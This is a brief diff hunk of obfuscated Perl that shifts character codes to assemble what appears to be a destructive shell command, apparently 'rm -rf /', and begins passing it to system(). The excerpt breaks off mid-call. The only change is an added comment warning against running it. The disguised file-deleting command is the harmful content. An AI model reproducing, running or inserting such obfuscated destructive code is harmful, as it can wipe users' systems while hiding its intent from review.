@@ -1,3 +1,4 @@
+# do not run unless you know the consequences
 $I='*#/&';$II='%#';@2=qq!\ !;foreach(split//,
 $I){push@1,(chr(ord("$_")+67));}foreach(split
 //,$II){push@0,chr((ord("$_")+10));}system(("
